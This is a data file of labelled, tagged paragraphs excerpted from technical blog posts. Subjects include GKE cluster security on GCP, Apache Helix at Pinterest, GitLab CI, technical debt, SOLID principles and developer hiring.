131,"Your Kubernetes (K8S) cluster does the heavyweight lifting off when you run your microservice applications in Docker containers. Google Cloud Platform (GCP) provides managed K8S service named Google Kubernetes Engine (GKE). When you use GCP to host and run your microservices, it is important to make sure that your K8S cluster is set up in a highly secure fashion. Any kind of security model that you design and implement should be tried and tested right from the lowest environment such as Development before trying out in higher environments such as Production. This article is going to talk about securing your K8S cluster in GCP. The author has written Terraform scripts to manage all the GCP resources mentioned in this article. In-depth coverage of Terraform is beyond the scope of this article. The code can be accessed from the authors Github repository.","['Docker', 'Kubernetes', 'Gcp', 'Google Cloud Platform', 'Terraform']",11
132,"GCP provides a network boundary abstraction named Virtual Private Cloud (VPC). A given VPC can have one or more subnets. Each subnet in a VPC can be bound to a GCP region such as europe-west2 (London). When you create a GCP project (the environment in which you run your services in GCP), it comes with a default VPC. The default VPC provides you the required subnets for all the GCP regions, routing rules, and firewall rules. You dont want to use this default VPC for running your production applications. To start with, define a custom VPC for your application say mservice-network. If you have to comply with any data residency rules or regulations such as GDPR, you dont want to have subnets in all the GCP regions. In this article, the assumption is that your data cannot leave the United Kingdom and the only GCP region at the time of this writing is the London region of GCP. So you create only one subnet mservice-subnetwork in the VPC mservice-network. Most important attributes of a subnet include and not limited to IP range in CIDR format, GCP region, the VPC network, and the secondary IP ranges. It is mandatory to have nonoverlapping IPs for the primary and secondary IP ranges of your subnet. In this context, two secondary IP ranges have been defined for 1) pods in the K8S cluster, 2) services running in the K8S cluster. When you define your IP ranges, make sure that you have enough room for growth. Typically you should have more IPs for your pods as compared to your services. The Terraform script for creating your VPC and its subnets described here are available from this Github repository script file.","['Docker', 'Kubernetes', 'Gcp', 'Google Cloud Platform', 'Terraform']",11
133,"You have set up your VPC with only required subnets having enough IP ranges. Now it is time to set up your K8S cluster named mservice-dev-cluster in the VPC you have created. In other words, you are going to create a VPC aware K8S cluster and this means that all the nodes provisioned for building this K8S cluster will be bound to the selected VPC. When you define a K8S cluster, the following attributes are very important 1) region of the K8S cluster, 2) VPC, 3) subnet, 3) authentication settings, 4) networks that can access the K8S master, 5) private cluster settings, 6) IP allocation policy, 7) OAuth scope, 8) labels and 9) tags. In additions to these, you can include add-on services such as 1) HTTP load balancer, 2) horizontal pod autoscaling, K8S dashboard, and Istio, the service mesh. It is important to reinforce the foundation and K8S concepts before attempting to set up your K8S cluster even though GCP is going to manage it. The Terraform script for the VPC and its subnets described here are available from this Github repository script file.","['Docker', 'Kubernetes', 'Gcp', 'Google Cloud Platform', 'Terraform']",11
134,"It is better to disable the basic authentication in the K8S cluster by defining explicit user names and hard-coded passwords. In the authentication settings of the K8S cluster, keeping both these attributes empty will prevent the basic authentication. It is important to have detailed coverage of this section but that deserves a couple of articles scratch the surface and it is beyond the scope of this article Whitelisting the list of networks that can access the K8S cluster will give you better control over your K8S cluster. Typically bastion host in a network is used to manage the resources in general and the private K8S cluster in this context. If the bastion hosts are created in the same VPC as in the K8S cluster, then giving the IP range of the subnet in the white list is a good start. If that is not good enough, use the internal IP address of the bastion host explicitly and caution has to be exercised especially when the IP addresses are ephemeral.","['Docker', 'Kubernetes', 'Gcp', 'Google Cloud Platform', 'Terraform']",11
135,"It is important to make the K8S cluster as private. This means that the nodes used for building the K8S cluster will have only private IP addresses in GCP. This prevents the network from being accessed from outside using the public IPs of the nodes. In other words, the nodes in the K8S cluster are not exposed to the Internet. For achieving this, you have to enable a private endpoint for your K8S master and provide a K8S master CIDR block. K8S will create a separate VPC with just the addresses given in this CIDR block and it will peer it with your VPC. Making all these to have private IP addresses and whitelisting the networks that can access K8S master will make the K8S cluster protected from the Internet. If you recall the VPC and subnet setup details, you had defined two additional secondary IP ranges. Pick those two and assign one for the cluster pods and the other for the cluster services as the IP allocation policy of the K8S cluster. The node configuration setting should also include the required OAuth scopes and while doing this, makes sure that you are giving the required permissions for managing the nodes, logging, and monitoring.","['Docker', 'Kubernetes', 'Gcp', 'Google Cloud Platform', 'Terraform']",11
136,"Bastion host provides an entry point of a K8S cluster (in this context) and gives other resource management capabilities. Typically this is a Google Compute Engine VM created in the same VPC and subnet. This VM should have a public IP so that you can log in from anywhere. This can become a bit dangerous if you dont do proper access control to this VM. If you have a direct connection or VPN connection to your GCP project from your corporate network, you can safely disable the external IP for your bastion host. In other words, only a very selected few should have access to this VM. Since this VM is in the same VPC and the subnet IP range is whitelisted in the master access list of the K8S cluster, this VM can be used to manage the cluster. So this VM should have the Google Cloud SDK installed and the required tools such as kubectl. This page talks about the installation and configuration of Cloud SDK in a Debian/Ubuntu VM. For the production networks, it is also a good practice to turn on this bastion host only when during the initial setup time or during the break-glass-scenarios.","['Docker', 'Kubernetes', 'Gcp', 'Google Cloud Platform', 'Terraform']",11
137,"Once the bastion host is set up, you have to define the firewall rule to let you connect to the VM using SSH. For this purpose, for the given VPC, allow ingress traffic to TCP:22. If you have specific source IP ranges from where SSH connections can come such as your enterprise network from where there is VPN connectivity or direct connectivity to your GCP projects, you can whitelist them while creating the firewall rule. Otherwise, give the 0.0.0.0/0 CIDR range so that you can do SSH from anywhere. If the bastion host is created with specific network tags, you can include that while defining the firewall rule so that it will allow the ingress traffic to those VM instances having this specific network tags. These aspects are demonstrated in the firewall creation Terraform script.","['Docker', 'Kubernetes', 'Gcp', 'Google Cloud Platform', 'Terraform']",11
138,"The backlog item to be scored is introduced with a brief discussion. At least some of the team should already be familiar with the item and have had a chance to form some of their own opinions of it. First the team discus vagueness and uncertainty of the issue. They individually pick a score card from 15 for uncertainty, presenting them simultaneously brief further discussion between the team should help determine if the modal (most common) number is correct or find consensus on another number. This is then repeated for vagueness. Notes must be captured that explain the numbers, such as areas that need clarification or further research and the rationale for the score.","['Agile', 'Scrum', 'Software Estimation', 'Product Management', 'Product Backlog']",14
139,"Originally we managed our clusters by manually running scripts. It was error prone and became a big burden for the team as Rocksplicator started to run on more and more hosts. We knew that it was the time to implement automated cluster management and recovery for Rocksplicator to replace the original script driven method. We built an in-house cluster management prototype system and also did some research on existing open source solutions. Eventually we decided to adopt Apache Helix, which was open sourced by Linkedin. This was exactly what we were looking for as Helix was designed as a cluster management framework for partitioned and replicated distributed resources. However, we couldnt find much detailed information about how to apply Helix to Master-Slave real-time replicated storage-like systems. We had to ask questions in Helix mailing list, look into Helix docs and code to find out available features and build our own logics on top of what Helix provides. This post is to share our experiences and lessons learned.","['Cloud Computing', 'Pinterest', 'Engineering', 'Architecture']",10
140,"Figure 1. depicts the overall architecture of how Helix works with Rocksplicator powered services. Zookeeper sits in the center which stores resource mappings, configurations, messages between Helix controller and Rocksplicator, etc. This design is nice as it delegates critical data management to Zookeeper, which has been proven to be highly reliable. Helix controller constantly monitors events happening in the cluster, which include configuration changes, joining and leaving of Rocksplicator hosts, etc. Based on the latest status of the cluster, Helix controller computes an ideal state of resource mappings and sends messages to Rocksplicator services through Zookeeper to gradually bring the cluster into the ideal state. Each Rocksplicator host maintains a connection to Zookeeper to let others know its liveness. In the meantime, it pulls messages from Helix controller through Zookeeper, and changes its local states based on the messages received. Rocksplicator employs Master-Slave Helix state model for online mutable clusters and Online-Offline Helix state model for batch updated or cache-like clusters. This post will focus on the Master-Slave model as its more challenging to implement. Helix UI and Restful API are used to peek cluster status and change cluster configurations.","['Cloud Computing', 'Pinterest', 'Engineering', 'Architecture']",10
141,"In order to fully leverage the power of Helix, we decided to run it in FULL_AUTO mode, in which Helix decides both the location and the state of every data partition. To efficiently and safely run Rocksplicator services with FULL_AUTO mode, several Helix configurations are critical to set. First of all, settings DELAY_REBALANCE_ENABLE and DELAY_REBALANCE_TIME need to be set properly so that Helix will not move shards away from an offline host too soon. Because hosts need to temporarily go offline during a deploy and moving data partition between hosts is expensive for storage-like systems. On the other hand, we want to override this behavior for safety when the available replicas for a partition in the cluster is too low. Therefore we also need to set MIN_ACTIVE_REPLICAS properly. Note that all these configurations apply to partition movement only. Helix is free to change partition states (Master, Slave, etc) immediately when a host goes offline so that the number of write failures is minimized. When the number of offline hosts is above this threshold, Helix puts the managed cluster into a maintenance state in which no partition movement is allowed. This helps us protect our data during a disaster such as network partition or software bug caused service crashes.","['Cloud Computing', 'Pinterest', 'Engineering', 'Architecture']",11
142,"Rocksplicator changes the states of its local data partitions purely based on state transitioning messages received. There are two different scenarios where an OFFLINE -> SLAVE message would be sent. One case is when a partition is being moved to a host for the first time. The other case happens when a Rocksplicator service process restarted for a deploy and is coming back online. Unfortunately, Helix doesnt have a support to differentiate between these two scenarios. Rocksplicator could handle both cases in a unified way by firstly restoring a backup of the partition to local DB and then starting to replicate updates from the Master. Obviously, its unnecessary for the second scenario. To fix it, we added logics in Rocksplicator to check if a local DB requires rebuild when changing it from OFFLINE to SLAVE state. This is achieved by checking the timestamp attached with the most recent update in local WAL and comparing the latest local sequence number with that on remote replicas.","['Cloud Computing', 'Pinterest', 'Engineering', 'Architecture']",11
143,"Rocksplicator typically has multiple replicas for each data partition. When changing the state of a local replica, Rocksplicator needs to know the states of other replicas in the system so that it could setup the replication topology correctly. For example, when changing a replica from OFFLINE to SLAVE state, Rocksplicator needs to set up its local DB to replicate updates from Master or another SLAVE if no Master exists. The fact that Helix may change the states of multiple replicas simultaneously makes it almost impossible for Rocksplicator to reliably figure out the current states of other replicas. To solve this problem, we tried to use distributed Zookeeper locks to synchronize state transitions for replicas of the same partition. Unfortunately, this alone is not enough to fully solve the problem. After a Rocksplicator process finishes a state transition and releases the lock, another process may enter a state transition handler and acquire the lock before Helix controller exposes the state change. This race makes it possible that the state of a remote replica observed inside a transition handler is either its current state or previous state. We had to carefully design the state transition logics in Rocksplicator to be resilient to either cases.","['Cloud Computing', 'Pinterest', 'Engineering', 'Architecture']",8
144,"Generate a HELM chart We saw above how easy it is to deploy the application on a Swarm. Its not much harder to have it ready to be deployed on a Kubernetes cluster though. This goes through the creation of a HELM chart (HELM being the Kubernetes Package Manager). The following command creates the chart: As we can see, a folder and a couple of files were generated in the process: C __url__ contains the project metadatatemplates/ __url__ contains the Kubernetes manifest of the application. A special Stack resource is used __url__ contains the default values that will be used in the placeholders above. As we did not specify any settings file when generating the HELM chart, the values from __url__ are used.","['Docker', 'Docker Swarm', 'Kubernetes', 'DevOps']",7
145,Documentation plays a key role in any projects success. Selenium docs were not updated since selenium 2.0 release. In the latest upgrade selenium documentation is also going to be refreshed and detailed [WIP]. You can access it on __url__ changes.,"['Selenium', 'Selenium Webdriver', 'Selenium Test Automation', 'Selenium Testing', 'Selenium Software Testing']",18
146,"To a certain extent I think theyre right, we do have a problem with vendor lock in with the cloud. But I think the cloud is a very different battle than the one that was fought against proprietary software back in the 90s. Because even if you had the source you literally couldnt replicate Google or Amazons cloud. The hardware, and the scale it is deployed at, is the secret sauce.","['Open Source', 'Licensing', 'Technology', 'Software', 'Ethics']",16
147,"Setting up a Continuous Integration and Continuous Deployment pipeline is very simple in Gitlab. Its baked into the Gitlab offering and easily configurable by just adding a.gitlab-ci file to the root of your project. A CI/CD pipeline is triggered when you push code to the Gitlab repo. The pipeline must run on a server, which is called a Runner. Runners can be virtual private servers, public servers, or anywhere you can install the Gitlab runner client. In our use case, we are going to install a runner on the k8s cluster so that jobs are executed in pods. This client also makes it scaleable so we can run multiple jobs in parallel.","['Docker', 'Kubernetes', 'Gitlab', 'DevOps', 'Go']",7
148,"Next we have the build_app: job. This name is made up by our project and can be anything you would like. The image indicates we are using the latest Docker image from Docker Hub. The stage tells Gitlab what stage this job is in. One neat thing to keep in mind is that jobs in the same stage will run in parallel. The only: tag indicates that we will only run this job on commits to the master branch. Finally the script: is the meat of the job, which will run the docker build command to create our image, then docker login to the Gitlab registry, and then docker push that image to our registry.","['Docker', 'Kubernetes', 'Gitlab', 'DevOps', 'Go']",7
149,"Customers pay for the results they obtain by using your software products. They dont pay for regulatory compliance reviews. They expect regulatory compliance, but the cost is on you. They dont pay for software testing. They expect the software to work, but the cost of ensuring that is on you. They dont pay for security assessments. They expect the system and its environment to be secure, but the cost of making it so is on you.","['Agile', 'Agile Transformation', 'Coding', 'Software Development', 'Scrum']",16
150,"The methods you use to comply with regulations, to validate software functionality, to ensure reasonable security, and other details are up to you. Customers dont care how you do it. But those things are not what customers are paying for. Doesnt it make sense to minimize the overhead of achieving those results? What effect would it have on your profit margin? What effect would it have on your ability to compete? What effect would it have on your ability to pivot in response to market changesor to drivesuch changes? If your staff are constantly busy checking the functionality of the code, looking for security holes, reviewing systems for compliance, and other activities that may be necessary but that are not what customers pay for, then how much time do they have left over to deliver customer-defined value? Your mechanisms for delivering customer-defined value can grow strong and thrive if only you remove or minimize the underbrush in your processes. A manual, after-the-fact, formal review process is optional. Manual, after-the-fact, formal security review is optional.","['Agile', 'Agile Transformation', 'Coding', 'Software Development', 'Scrum']",13
151,"The reviews are carried out by specialists in each area. Few, if any organizations can afford to staff every development team with specialists in multiple areas of expertise. That means a few specialists are in demand to support a potentially large number of teams concurrently. Much of the extended lead time occurs because work has to wait for specialists to become available to review it. In the case of software testing, in large organizations the bottleneck affects the availability of test environments and test data, as well as the availability of the specialists themselves.","['Agile', 'Agile Transformation', 'Coding', 'Software Development', 'Scrum']",0
152,"Insufficient time to do a thorough job. In keeping with the 80/20 rule, most of the review activity comprises relatively routine, repetitive, and predictable tasks. When specialists must perform these tasks manually, they often lack the time to complete all the kinds of review activities for which human observation and creativity are critical. The routine activities tend to be baseline requirements that cannot be set aside. The result in many cases is that the specialists must use all the available time performing routine, repetitive tasks, and never have an opportunity to apply their unique skills. In software testing and in security reviews, the opportunity to learn about previously-unknown possibilities is lost when the specialists lack time to explore the system.","['Agile', 'Agile Transformation', 'Coding', 'Software Development', 'Scrum']",0
153,"The importance of these three needs leads people to be very cautious about changing the way they handle them. Do practical alternatives exist that might shorten lead times, reduce mistakes, and improve quality while still providing high confidence of regulatory compliance, correct functionality, and system security? The current industry trend toward continuous delivery has caused everyone in the field to think about ways to automate as many repetitive and routine functions as possible. Referring again to the 80/20 rule, or Pareto Principle, the majority of review activities are repetitive and routine. Can some of those activities be automated? Regulatory compliance is about following rules. Computers are very good at checking to see that rules have been followed. For example, rules pertaining to the display of personally identifiable information (PII) are straightforward.","['Agile', 'Agile Transformation', 'Coding', 'Software Development', 'Scrum']",12
154,"YAML file __url__ (openapi/getting_started/openapi.yaml) is the Open API specification of this API service. It comprises 5 parts: openapi, info, servers, components, and paths.openapiopenapi is a string specifying the version number of Open API specification this document uses. For this tutorial you will use Open API Specification Version 3.infoinfo is the metadata of the API service:serversservers specifies connectivity information of the API service. For this tutorial you will use a local address, localhost:8080.componentscomponents are a collection of reusable schemas throughout the API service. For this tutorial you will use two schemas, User and Error Message, as the output of the Get User endpoint.pathspaths are the resources and methods supported by the API service: Open API generator can now prepare server-side and client-side artifacts: Two Python packages now reside in codegen_server and codegen_client. The schemas (User and Error Message) live in the models folder of codegen_server/openapi_server and codegen_client/openapi_client as standard Python classes. controllers in codegen_server/openapi_server specifies how the API service runs; modify the controllers to create your own HTTP RESTful API service. The default controller (codegen_server_completed/openapi_server/controllers/default_controller.py) looks like this: To run the API service, change to the directory codegen_server_completed/ and run the following commands: Try the API service in browser at localhost:8080/users/1. You should see the following outputs: Open API Generator also provides a UI for your convenience; visit it at localhost:8080/ui.","['API', 'Google Cloud Platform', 'Open Api', 'Grpc', 'Auth']",15
155,We start practicing it as soon as we are born into this world. We get better and better at it. We enrich our lives through it. We communicate because we arent alone.,"['API', 'Clean Architecture', 'Gateway', 'Solid', 'Object Oriented Design']",4
156,"During my career as a software engineer, I can safely say that I handcrafted dozens of gateways. Furthermore, I had to modify a similar number of legacy gateways. In most cases, it wasnt fun work. Gateways seem to be a magnet for responsibilities that shouldnt be theirs. Its common to find logic in them that has nothing to do with the application they want to communicate with, but instead with the application where they live. That is wrong, a clear violation of the single responsibility principle. Allow me to illustrate some common pitfalls with a very simple example.","['API', 'Clean Architecture', 'Gateway', 'Solid', 'Object Oriented Design']",12
157,"JSON, XML, Protocol Buffers, Message Pack, Avro. Well As clients of external APIs, we have to comply with their requirements. Life isnt fair, and whoever promised you that it is, lied. This step is actually quite interesting to me, because its complexity varies a lot with the target serialization format and the programming language that one is using. For example, XML is a bit of PITA to work with in Ruby, but fairly easy to do so in Java (Java was the go-to language back when XML was the cool kid on the block). On the other way around, we probably have JSON as an example, where Ruby absolutely shines.","['API', 'Clean Architecture', 'Gateway', 'Solid', 'Object Oriented Design']",19
158,All things about the transport go here.,"['API', 'Clean Architecture', 'Gateway', 'Solid', 'Object Oriented Design']",11
159,"The input of this step must be whatever you need to send the request to the external system. A URL, verb, headers and a body. A routing key, headers and a body. Transports have unavoidable specificities, so my advice is for you to not try to create abstractions here. Ive seen that mistake on a multitude of projects.","['API', 'Clean Architecture', 'Gateway', 'Solid', 'Object Oriented Design']",15
160,"Most APIs make use of the transports capabilities to negotiate things that arent directly related with the request itself, authentication being the usual example. With that said, the world has its fair share of mysteries and bad APIs (being the latter a subset of the former). For example, Ive seen several APIs that require credentials to go in the payload. In such a scenario, one may ask: is it in this step that should we add credentials to the request payload? To me the answer is no, and Ill add the credentials to the request payload in step 2. My rationale for these kinds of decisions always ends with me asking myself the following question: if the transport changes, will I need to change this? If the answer is yes, the logic goes in this step. If the answer is either no or maybe, I then write-down a rationale for whatever my decision is.","['API', 'Clean Architecture', 'Gateway', 'Solid', 'Object Oriented Design']",11
161,"Learn your history Historical awareness provides a solid toolset to ask, What is different this time? The answer (or lack of one) often determines the success or failure of a new technology. But if you feel overwhelmed at the speed of it all and the occasional burst of Java Script fatigue is kicking in, then slow down and remember that its a long game and that following the large trends is more important than constantly rushing to rewrite all your apps in the newest framework. Peter Norvig puts it great in his essay Teach Yourself Programming in Ten Years.","['Programming', 'Learning', 'Development', 'Jamstack', 'JavaScript']",2
162,"We often hear people talking about the gap between business and software development. But what does this actually mean? Can we better characterize this broad statement and make it more concrete with examples? And with this understanding, can we sketch out solutions to improve the situation? Why is it so hard to bridge the gap between business and technical domains? One reason is that it is difficult to establish measurable causal relationships between the two domains. Will we increase revenue if we do more automated testing? Why should we invest resources to reduce technical debt? Are we going to reduce costs if we move towards continuous delivery? Even when business stakeholders understand this jargon, even when they understand the rationale of software engineering practices, they have a hard time quantifying their impact. As a result, investment decisions are not easy to make.","['Agile', 'Due Diligence', 'Metrics', 'Software Development', 'Software Engineering']",12
163,"For instance, our goal might be to understand how well we serve our customers, which is fairly abstract. We might then come up with more concrete questions such as: how quickly do we respond to their needs? How often do we cause issues that prevent them to work? Is the frequency of such situations decreasing or increasing? How happy are with our products and services? To answer each of these questions, we might look at very precise metrics such as average response time, lead time for bug fixes per severity, number of new critical bugs per week, Net Promoter Score, churn rate, etc. For every question, one needs to define a formula that combines multiple metrics and produces a measure.","['Agile', 'Due Diligence', 'Metrics', 'Software Development', 'Software Engineering']",0
164,"In a recent discussion about technical debt and what to do about it, someone suggested that we shouldnt fix technical debt. To be honest, at first I couldnt believe this was a serious suggestion. And it was backed up with an interesting line of reasoning. Below is my attempt at explaining that reasoning and expanding on it.",['Technical Debt'],12
165,"Im going to assume you already know about technical debt. If you need a refresher, I suggest you look at one of the following: Ward Cunningham on Tech Debt Uncle Bob on A mess is not tech debt Martin Fowlers Technical Debt Quadrant Henrik Knibergs take on Good and Bad Technical Debt Ron Jeffries thoughts about Tech Debt Going out to find technical debt doesnt in itself add value. Neither does keeping records of technical debt. Even fixing technical debt doesnt necessarily provide value. For example, imagine you have a component which has a lot of messy old code but it works okay. Based on the product roadmap, you expect this code isnt going to change in the next half year. What is the value of refactoring this code? Sure, after refactoring the code is in better shape. However, if left as is the messiness isnt directly hurting your development effort since you probably wont have to change it.",['Technical Debt'],12
166,"This cleaning up as you go doesnt need separate stories, budgets or approval. You as an engineer can and should just do it as part of your regular work. In fact, your Definition of Done likely already mandates this. Either way, engineers have the duty to apply good engineering practices such as TDD, BDD, Clean Code, CI/CD and pair programmingto name just a few of my favorites. All that is needed is the courage to take this into account during refinement and planning, and the discipline to apply it rigorously. If features or stories take longer than previously, it is not because you are slowing downit is because you are improving quality, and this will save time in the long run.",['Technical Debt'],12
167,"The extreme boy scout rule works on small to medium refactors. Good slicing of stories can help to push a lot of work into this category. Nevertheless, there may still be structural changes that are too big to handle this way. I had some thoughts on that not so long ago, but more and more I believe you should avoid doing even these large changes separately. So, how do you avoid doing these separately? I think this requires that we work with Product Owners or Product Managers (or whatever these folks are called in your organisation) to understand the product roadmap. Where architectural changes or significant technology transitions are needed to support the roadmap, make sure this work is included as part of the features. Whats more, be rigorous in bringing the code completely in line with the new architecture. Just as you can slice the work for the features, you can also slice the architectural changes. Just be sure that all of it gets done as part of the feature and that none of it is considered optional.",['Technical Debt'],1
168,"That still leaves the case when were forced to make short-cuts to meet critical business commitments. In such cases where we consciously decide to add tech debt, we have to treat the newly added tech debt as a separate backlog item. Removing this tech debt must be given the highest priority (after meeting those critical commitments). If the organisation is likely to favor other features, I would consider making the tech debt removal part of the feature that caused it. That feature is then considered not finished. Although it is only an administrative trick, it may help keep the focus on removing the tech debt.",['Technical Debt'],16
169,"Thankfully we dont need to connect the modules ourselves. All we need to do: Write some code using the Verilog language. The Verilog compiler converts our code into connections between the logic modules. Lets look at a simple Verilog code module Take a moment to read through the above Verilog code (which looks like C). On an Arduino we write C programs that are compiled into CPU instructions. On the FPGA however, our Verilog programs are compiled into connections between many many logical semiconductor modules. Since FPGA operates at the logical hardware level, we will code using hardware concepts like Clock Signals: All computers (including microcontrollers and FPGAs) operate on very precise clock tick signals that alternate between high and low states at a fixed rate. Thats why we visualise the Clock Signal as a square wave, like you see in the screen.","['Arduino', 'Gowin', 'IoT', 'Internet of Things', 'Programming']",5
170,"Why is a collaborative approach considered the best way to find yourself an ace developer? What are the steps to HR and tech managers working successfully together in the recruitment process? Lets face it, its impressive but almost impossible to be an HR executive, even in the tech field, and know how to navigate your way around the technical side of the many varying developer/engineering roles. With a collaborative approach, you can share the technical portions of the hiring process with members of the engineering team. Remember, your company hired the current engineering team because of their skills and culture fit, so make use of it! Not only will developers be more fluent in presenting the companys languages, processes, upcoming projects, etc. but candidates get a chance to connect with the developers that they could, if successful, be working alongside. 48% of developers prioritize working with brilliant colleagues when looking for a new role. A team-based hiring approach could positively impact more than you realize. A candidate will value being able to delve into tech talk, knowing that they are being fully understood and getting their technical questions answered.","['Recruiting', 'Tech Recruiting', 'Hiring', 'HR', 'Agile']",0
171,"Make sure to communicate with tech managers at each step of your hiring process. If you dont use any specific ATS (Applicant Tracking System) internally, a good tip for collaborating around your hiring funnel is to use Trello, the project management tool. Trello allows you to create a dedicated column for each stage of your recruiting process (e.g: Resumes | Pre-screening | First interview | Technical Test | Shortlist). Share your board with every person involved in the recruitment. Then just drag candidates into the appropriate column as they go through your funnel. Its visual and everyone will see at a glance how things are going. Also, dont forget to allow time for feedback within your team. For example, Jeff Mc Conathy, VP of Engineering for Consumer Services at Trulia, always conducts a post-interview meeting to share feedback.","['Recruiting', 'Tech Recruiting', 'Hiring', 'HR', 'Agile']",0
172,"From an HR perspective, candidate experience is invaluable for the potential hire. First, a positive candidate experience will help you stand out from the competition, showcasing a strong employer brand. Second, it will ease the relationship between HR and tech managers. Create the best experience possible for candidates. Tech managers will see that youre doing everything possible to promote the company and its tech-friendly side. During the pre-screening phase, notify candidates of the reception/rejection of their application. For short-listed candidates, send clear invitation emails to interview. The trickiest part remains the technical interview phase which can be particularly stressful for your future hires.","['Recruiting', 'Tech Recruiting', 'Hiring', 'HR', 'Agile']",0
173,"Notebooks are, in essence, managed JSON documents with a simple interface to execute code within. Theyre good at expressing iterative units of work via cells, which facilitate reporting and execution isolation with ease. Plus, with different kernels, notebooks can support a wide range of languages and execution patterns. These attributes mean that we can expose any arbitrary level of complexity for advanced users while presenting a more easily followed narrative for consumersall within a single document. We talk about these attributes and their supporting services more in our previous post. If you havent read it yet, its a good introduction to the work were doing on notebooks, including our motivations and other use cases.","['Jupyter', 'Nteract', 'Container Orchestration', 'Scheduling', 'Workflow']",19
174,"In this scenario, we would need four notebooks. One to collect our input data. One to enhance our raw data with geographical information. One to be parameterized for each region. And one to push our results to a report. Our aggregate notebook, for example, might have a parameterized execution such as: We have a few lines of code to execute a simple SQL statement. You can see that in cell [4] we have our injected parameters from Papermill overwriting the default region_code. The run_date is already what we want, so well keep the default instead of overwriting it.","['Jupyter', 'Nteract', 'Container Orchestration', 'Scheduling', 'Workflow']",8
175,"In part 1 of the SOLID series, we learned about how to write more flexible code with the Single Responsibility Principle (SRP). By isolating pieces of functionality in individual classes/modules the SRP helps us guard against unnecessarily coupling responsibilities. If the implementation of one responsibility changes, SRP-adherent design prevents the change from affecting other responsibilities. However, decoupling responsibilities does not necessarily mean a complete decoupling of classes/modules, functions, objects, etc. In most object-oriented code, different objects must deal with one another in some fashion. What then happens when a particular object needs to be changed? As with responsibility changes, this poses a challenge for the maintenance of downstream objects that could inadvertently be affected by the change. One way to reduce the impact of this challenge is to adhere to the second of the SOLID principles: the Open-Closed Principle (OCP).","['Software Development', 'Programming', 'Coding', 'Software', 'JavaScript']",9
176,"Robert C. Martin, creator and chief evangelist of SOLID, credits Bertrand Meyer as the originator of the OCP. In his 1988 book Object Oriented Software Construction, Meyer describes the need to develop flexible systems that can adapt to change without breaking. To do this, Meyer advocates the design of systems where entities (classes, modules, functions, etc) are open for extension, but closed for modification. In his development of the SOLID principles, Martin runs with this idea, describing it as a straightforward attack against the threat of fragile, rigid, unpredictable and un-reusable code [1]. For his part, Martin breaks down the OCP into its two constituent parts, defining code that is open for extension as code to which you can add new behavior, and code that is closed for modification as code that is inviolate in that its design should never be changed once implemented. In other words, the OCP says that you can always add new code to an object, but should never change the design of old code.","['Software Development', 'Programming', 'Coding', 'Software', 'JavaScript']",9
177,"The chief benefit of the OCP is maintainability. If you adhere to the OCP you can greatly decrease future maintenance costs. The opposite applies as wellwhen you dont adhere to the OCP, future maintenance costs will be greater. Consider how the coupling of two entities affects their respective maintainability. The more a given entity knows about how another one is implemented, the more we can say that they are coupled. Therefore, if one of the two entities is changed, then the other must be changed too. Here is a simple example: In this snippet we have a simple function called announce that takes an object as an argument and uses that objects items and description properties to log a message to the console. When we call this function and pass it the favorite Cities object we get the expected output. But what if we decide that we dont want the favorite Cities object to store its items in an array and decide its better to store them in an object? By changing our favorite C __url__ implementation from an array to an object we effectively broke our announce function. The reason is that the announce function knows too much about how favorite Cities was implemented and expects it to have an items property that is an array. Fixing this would be relatively trivial (perhaps we could add a conditional to the announce function to check first whether the __url__ property is an array or an object), but at what long-term cost? What if we didnt make this change until much later in development and we had lots of functions that used collection.items? We would then have to add conditionals to every place that referenced items.","['Software Development', 'Programming', 'Coding', 'Software', 'JavaScript']",9
178,"In a 2014 blog article, Martin discusses the apparent paradox in writing entities that are simultaneously open for extension and yet closed to modification [2]. How can something be both open and closed at once? Martin uses the example of plugin architecture to describe how new features can be added to software without modifying the original source code. Plugins are useful at the system level, but what about at the entity level when objects are interacting with one another? In this case, the key is abstraction. We had a taste of this in the simple examples above when we abstracted out the log Items functionality of our collection objects. Lets see if we can do the same with a slightly more complex program.","['Software Development', 'Programming', 'Coding', 'Software', 'JavaScript']",9
179,"In this snippet we use the OLOO pattern to define a Monster Manager prototype object and two types of monster prototypes, Kaiju and Great Old One. After initializing some monsters and an array of locations, we then initialize a new Monster Manager called my Monster Manager and call its rampage All method, unleashing our monsters on those unlucky cities the random Location method happens to choose (sorry!) Can you spot any problems in this code related to OCP adherence? Take a look at the rampage All methodright now it iterates over each monster and checks whether they are of type Kaiju or Great Old One and then logs an appropriate message. What happens when this monster-filled world surfaces some new and terrible type of monster? In order for the program to work we would have to add another branch of conditional logic to the rampage All method. In other words, we would have to modify the source code and therefore break the OCP. Doing so would not be a big deal with just one more monster type, but what about 10 new types? (Apparently this poor world is filled with monsters!) In order to extend the behavior of our Monster Manager (that is, let it deal with more types of monsters) we are going to have to think about how we deal with individual monster types.","['Software Development', 'Programming', 'Coding', 'Software', 'JavaScript']",15
180,"The second of the SOLID principles of software development is the Open-Closed Principle (OCP), which says that software entities (objects, classes, modules, etc.) should be open for extension but closed to modification. In this context, extension means adding new behavior and modification means altering existing source code. The OCP is a useful principle for keeping your code maintainable because it ensures that old working code is not changed (causing downstream breakage) while simultaneously allowing for the addition of new behavior. One method for adhering to the OCP is relying on abstractions rather than concretions. When one object interacts with another, it should do so through an abstraction, allowing its partner object to worry about specific implementation. The classic way to do this is with interfaces or other abstractions; however, some languages like Java Script do not provide native interface abstractions. In this case, it is still possible to follow the OCP either through convention or through custom validation methods.","['Software Development', 'Programming', 'Coding', 'Software', 'JavaScript']",9
181,"Now that logging aggregators are becoming ubiquitous, a common issue that we, developers, have to face is how to connect the log output of our applications to those tools. Some of the issues that we encounter during that process are: Usually we dont use an aggregator in development, we simply want to see all the logs in the development console, so the application has to start without issues when there is no aggregator listening. One does not simply throw the logs to Mordor I mean the aggregator. We need to parse the different fields of the log lines so the messages can be easily filtered afterwards. The aggregator might go down, for some reason, and then it would be nice not to lose the logs completely. On the other hand, we have to be careful with the size of the logs generated in the machine where the app is deployed, as space is usually a concern, especially now that multiple small machines are now the norm.","['Elasticsearch', 'Spring Boot', 'Log4j2']",10
